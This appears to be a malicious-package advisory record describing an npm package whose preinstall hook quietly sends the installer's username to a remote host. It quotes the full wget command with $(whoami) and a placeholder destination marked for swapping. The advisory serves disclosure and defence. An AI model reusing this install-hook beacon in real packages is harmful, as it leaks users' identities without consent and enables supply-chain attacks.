summary: dependencykfee-2 preinstall exfiltrates installer username via HTTP beacon
details: package.json declares a preinstall lifecycle hook that runs `wget --quiet "http://google.com/?user=$(whoami)"` on `npm install`. The command captures the installer's local username via `$(whoami)` and embeds it as a query parameter in an outbound HTTP GET, leaking installer identity to the destination host's access/DNS logs on every install without user consent. The script carries a trailing `# CHANGE IP ADDRESS` comment, indicating google.com is a placeholder destination in a dropper/beacon template; the exfiltration primitive is fully functional regardless of whether the destination has been swapped for an operator-controlled host. The package otherwise provides no documented functionality consistent with needing this behavior.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
